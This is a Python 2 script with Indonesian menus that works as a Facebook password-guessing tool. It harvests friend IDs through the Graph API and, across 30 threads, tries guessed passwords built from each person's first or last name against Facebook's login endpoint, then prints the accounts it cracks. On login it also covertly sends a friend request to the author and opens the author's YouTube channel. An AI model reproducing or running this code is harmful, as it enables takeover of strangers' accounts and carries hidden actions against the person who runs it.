#!/usr/bin/python2
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
logo = """  
\033[32m….._\____________________,,__
\033[32m…./ `–│││││││││  \033[0;1mMejuah-Juah -->
\033[32m…/_==o ______________\033[0;1mHoras Medan -->
\033[32m…..),—.(_(__) /
\033[32m….// (\) ),——
\033[32m…//___//
\033[32m../`—-’ / …
\033[32m./____ / … 
\033[32m╔═══════════════════════════
\033[33m{✓}\033[0;1mAuthor \033[0;1m: \033[0;1mG U N A W A N
\033[33m{✓}\033[0;1mRecode \033[0;1m: \033[0;1mbye nawan
\033[33m{✓}\033[0;1mYoutube \033[0;1m: \033[0;1mnawan barus
\033[32m╚═══════════════════════════"""""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[0;1m-"
		print('\033[34;1mSilahkan Daftar fb baru dari google chrome' )
		print('\033[34;1mAgar tidak terkena chekpoint saat login' )
		print 42*"\033[0;1m-"
		print('\033[1;96m[✓] \x1b[33;1mLOGIN AKUN FACEBOOK KAMU \x1b[1;96m[ ! ]' )
		id = raw_input('\033[32m[+] \x1b[33;1mID/Email \x1b[33;1m: \x1b[0;1m')
		pwd = raw_input('\033[32m[+] \x1b[33;1mPassword \x1b[33;1m: \x1b[0;1m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
			os.system('xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ')
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m Nama Anda \033[1;91m: \033[0;1m"+nama+"\033[0;1m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m ID Anda   \033[1;91m: \033[0;1m"+id+"\x1b[0;1m              "
	print 42*"\033[1;96m="
	print "\x1b[32m1.\x1b[0;1m Hack facebook sekarang \033[32m(✓)"
	print "\n\x1b[32m0.\x1b[34;1m Keluar            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih()
		
		
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[32m1.\x1b[0;1m Hack dari daftar teman"
	print "\x1b[32m2.\x1b[0;1m Hack dari daftar teman dari teman \033[32m(✓)"
	print "\n\x1b[32m0.\x1b[34;1m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[32m="
		jalan('\033[1;96m[#] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[32m="
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[0;1m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✓] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih_super()
	
	print "\033[1;96m[+] \033[33;1mTotal ID \033[1;93m: \033[0;1m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[33;1m✓\033[1;96m] \033[33;1mLagi Proses bosku, mohon sabar \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[32mProses sedikit lama tidak seperti biasanya ')
	print('\x1b[1;96m[!] \x1b[32msekarang saya pakai 12 tebakan password ')
	print 42*"\033[34;1m-"
	print('\x1b[1;96m[!] \x1b[0;1mjika hasil cp, Harap simpan selama 2 hari ')
	print('\x1b[1;96m[!] \x1b[0;1mdalam 2 hari hasil cp akan pulih sendiri ')
	print 42*"\033[33;1m-"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
				print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
				print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
					print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
					print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
						print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
						print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
							print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
							print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
								print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
								print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
									print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
									print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
										print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
										print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
											print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
											print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
											cek.close()
											cekpoint.append(user+pass4)
										else:
											birthday = 'Kontol'
											pass5 = birthday.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
												print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
												print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
													print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
													print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
													cek.close()
													cekpoint.append(user+pass5)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	super()
	
       
		
if __name__ == '__main__':
	login()
